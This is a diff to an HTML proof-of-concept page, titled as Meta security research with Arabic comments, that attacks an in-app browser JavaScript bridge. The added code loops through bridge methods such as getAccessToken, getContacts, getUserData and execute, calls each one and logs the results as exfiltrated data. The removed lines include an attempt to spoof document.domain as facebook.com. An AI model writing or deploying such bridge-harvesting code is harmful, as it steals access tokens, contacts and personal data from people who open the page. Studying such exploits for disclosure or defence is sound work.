@@ -2,18 +2,12 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <meta name="referrer" content="no-referrer">
-    <script>
-        // محاولة تخطي فحص النطاق الأولي
-        try {
-            Object.defineProperty(document, 'domain', {value: 'facebook.com'});
-        } catch(e) { console.log("Domain override failed"); }
-    </script>
     <title>Meta RCE PoC - Security Research</title>
     <style>
         body { font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
-        .log { border: 1px solid #333; padding: 10px; margin-top: 20px; background: #000; overflow-x: auto; }
-        .success { color: #fff; background: #008000; padding: 2px 5px; }
+        .log { border: 1px solid #333; padding: 10px; margin-top: 20px; background: #000; overflow-x: auto; font-size: 12px; }
+        .success { color: #fff; background: #008000; padding: 2px 5px; font-weight: bold; }
+        .danger { color: #ff0000; font-weight: bold; }
     </style>
 </head>
 <body>
@@ -31,30 +25,44 @@
         }
 
         function startExploit() {
-            log("Starting discovery phase...");
+            log("Checking for bridge injection...");
 
-            // 1. التحقق من وجود الجسر (Vector 1)
             if (window.iabjs_unified_bridge) {
                 status.innerHTML = "<span class='success'>BRIDGE ACTIVE</span>";
                 log("[+] FOUND: iabjs_unified_bridge");
 
-                // 2. استخراج الدوال (Reflection) كما في PoC المخطط له
-                try {
-                    var proto = Object.getPrototypeOf(window.iabjs_unified_bridge);
-                    var methods = Object.getOwnPropertyNames(proto);
-                    log("[*] Available Methods: " + methods.join(", "));
-                    
-                    // 3. محاولة سحب البيانات الحساسة (RCE Sink)
-                    if (window.iabjs_unified_bridge.getAccessToken) {
-                        window.iabjs_unified_bridge.getAccessToken(function(token) {
-                            log("🚨 EXFILTRATED TOKEN: " + token);
-                        });
+                // --- مكان وضع الدوال الجديد ---
+                const secretMethods = [
+                    'getAccessToken', 
+                    'getContacts', 
+                    'getUserData', 
+                    'sendIntent', 
+                    'launchCaspian',
+                    'execute'
+                ];
+
+                log("Attempting to brute-force hidden methods...");
+
+                secretMethods.forEach(function(method) {
+                    if (window.iabjs_unified_bridge[method]) {
+                        log("<span class='success'>🔥 Detected sensitive method: " + method + "</span>");
+                        
+                        try {
+                            // محاولة استدعاء الدالة لجلب البيانات
+                            window.iabjs_unified_bridge[method](function(result) {
+                                log("<span class='danger'>🚨 EXFILTRATED DATA (" + method + "): </span>" + JSON.stringify(result));
+                            });
+                        } catch(e) { 
+                            log("[-] Could not execute " + method + ": " + e.message); 
+                        }
+                    } else {
+                        log("[-] Method " + method + " not found.");
                     }
-                } catch(e) {
-                    log("[-] Error during reflection: " + e.message);
-                }
+                });
+                // ------------------------------
+
             } else {
-                log("[-] Bridge not detected. Retrying in 1s...");
+                log("[-] Bridge not found yet. Retrying in 1s...");
                 setTimeout(startExploit, 1000);
             }
         }
